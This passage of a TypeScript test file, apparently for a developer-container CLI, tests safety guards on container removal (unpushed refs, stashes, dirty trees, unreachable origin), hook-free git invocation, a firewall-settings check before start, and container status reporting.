    await removeContainer(forced, names, { force: true, keepVolumes: false, user: 'dev', kunjVersion: VERSION });
    expect(forced.callsOf('remove')).toEqual([[{
      containers: [names.helper, names.container],
      volumes: [names.workspaceVolume, names.homeVolume],
      networks: [names.network],
    }]]);
  });

  it('removes a clean container and keeps volumes on request', async () => {
    const b = guardBackend(CLEAN);
    const guard = await removeContainer(b, names, { force: false, keepVolumes: true, user: 'dev', kunjVersion: VERSION });
    expect(guard).toEqual({ unpushedRefs: [], stashes: 0, dirty: false, originReachable: true });
    expect(b.callsOf('remove')).toEqual([[{ containers: [names.helper, names.container], volumes: [], networks: [names.network] }]]);
    expect(b.methods()).not.toContain('start');
  });

  it('remove guard fails closed when origin is unreachable', async () => {
    const b = guardBackend(CLEAN, { origin: 128 });
    await expect(removeContainer(b, names, { force: false, keepVolumes: false, user: 'dev', kunjVersion: VERSION })).rejects.toThrow(/origin.*--force/s);
    expect(b.methods()).not.toContain('remove');

    const hung = guardBackend(CLEAN);
    hung.hangOn.add('git -c core.fsmonitor=false -c core.hooksPath=/dev/null ls-remote --exit-code origin HEAD');
    const guard = await inspectForRemove(hung, names, CTX);
    expect(guard.originReachable).toBe(false);
  });

  it('counts stashes and tracked changes', async () => {
    const stdout = CLEAN.replace('@@stash\n0', '@@stash\n2').replace('@@status-exit', '1 .M N... 100644 100644 100644 a b src/x.ts\n@@status-exit');
    const guard = await inspectForRemove(guardBackend(stdout), names, CTX);
    expect(guard).toMatchObject({ stashes: 2, dirty: true });
  });

  it('fails closed when git stash or git status fails, or never reports', async () => {
    const stashFailed = await inspectForRemove(guardBackend(CLEAN.replace('@@stash-exit 0', '@@stash-exit 128')), names, CTX);
    expect(stashFailed.unreadable).toEqual(['stash']);
    expect(describeGuard(stashFailed)).toContain('git stash failed in the container, so it cannot be checked');

    const statusFailed = await inspectForRemove(guardBackend(CLEAN.replace('@@status-exit 0', '@@status-exit 128')), names, CTX);
    expect(statusFailed).toMatchObject({ dirty: true, unreadable: ['status'] });

    // Cut short: neither section reported its exit code
    const cut = await inspectForRemove(guardBackend('@@refs\nrefs/heads/feature/x 0\n@@stash\n'), names, CTX);
    expect(cut).toMatchObject({ dirty: true, unreadable: ['stash', 'status'] });
    await expect(removeContainer(guardBackend('@@refs\n'), names, { force: false, keepVolumes: false, user: 'dev', kunjVersion: VERSION })).rejects.toThrow(/--force/);
  });

  it('counts a detached HEAD and a ref whose rev-list failed as unpushed', async () => {
    const stdout = CLEAN.replace('@@stash', 'HEAD 2\nrefs/heads/broken \n@@stash');
    const guard = await inspectForRemove(guardBackend(stdout), names, CTX);
    expect(guard.unpushedRefs).toEqual(['HEAD', 'refs/heads/broken']);
  });

  it('treats only a leading @@none as never cloned', async () => {
    const tricky = CLEAN.replace('@@status\n', '@@status\n1 .M N... 100644 100644 100644 a b @@none\n');
    expect((await inspectForRemove(guardBackend(tricky), names, CTX)).dirty).toBe(true);
    expect(await inspectForRemove(guardBackend('@@none\n'), names, CTX)).toEqual({ unpushedRefs: [], stashes: 0, dirty: false, originReachable: true });
  });

  it('runs every guard git command with fsmonitor and hooks off', async () => {
    const b = guardBackend(CLEAN);
    await inspectForRemove(b, names, CTX);
    const script = (b.callsOf('exec')[0][1] as string[])[2];
    const gitCalls = script.match(/(?<![.\w-])git [^|;}\n]*/g) ?? [];
    expect(gitCalls.length).toBeGreaterThan(4);
    for (const call of gitCalls) expect(call).toContain('git -c core.fsmonitor=false -c core.hooksPath=/dev/null');
  });

  it('refuses to start a stopped container with no recorded firewall settings', async () => {
    const b = guardBackend(CLEAN, { state: 'exited' });
    b.existing[0].labels = labelsFor(REPO.id, BRANCH, { [LABEL.role]: 'main' });
    await expect(inspectForRemove(b, names, CTX)).rejects.toThrow(/firewall/);
    expect(b.methods()).not.toContain('start');
  });
});

describe('stopContainer', () => {
  it('stops the helper and the container', async () => {
    const b = new FakeBackend();
    await stopContainer(b, names);
    expect(b.callsOf('stop')).toEqual([[names.helper], [names.container]]);
  });
});

describe('containerStatus', () => {
  const STATUS_CMD = (b: FakeBackend) => (b.callsOf('exec')[0][1] as string[]).join(' ');

  it('status times out per container', async () => {
    const b = new FakeBackend();
    b.hangOn.add('__hang__');
    const status = await containerStatus(b, 'id', 'dev');
    expect(status).toEqual({ agentRunning: null, head: null, ahead: null, dirty: null, status: 'timeout' });
    expect((b.callsOf('exec')[0][2] as ExecIO).timeoutMs).toBe(2000);
  });

  it('status distinguishes no tmux session from exec failure', async () => {
    const b = new FakeBackend();
    await containerStatus(b, 'id', 'dev');
    const key = STATUS_CMD(b);

    b.execResults.set(key, { exitCode: 0, stdout: 'tmux=1\n# branch.oid abc123\n# branch.head x\n# branch.upstream origin/x\n# branch.ab +3 -0\n' });
    expect(await containerStatus(b, 'id', 'dev')).toEqual({ agentRunning: false, head: 'abc123', ahead: 3, dirty: false, status: 'ok' });

    b.execResults.set(key, { exitCode: 0, stdout: 'tmux=0\n# branch.oid abc123\n? new.txt\n' });
    expect(await containerStatus(b, 'id', 'dev')).toEqual({ agentRunning: true, head: 'abc123', ahead: null, dirty: true, status: 'ok' });

    b.execErrors.set(key, new Error('docker exec failed: something broke'));
    expect(await containerStatus(b, 'id', 'dev')).toEqual({ agentRunning: null, head: null, ahead: null, dirty: null, status: 'error' });

    b.execErrors.set(key, new Error('docker exec failed: Error response from daemon: container abc is not running'));
    expect((await containerStatus(b, 'id', 'dev')).status).toBe('stopped');
  });
});
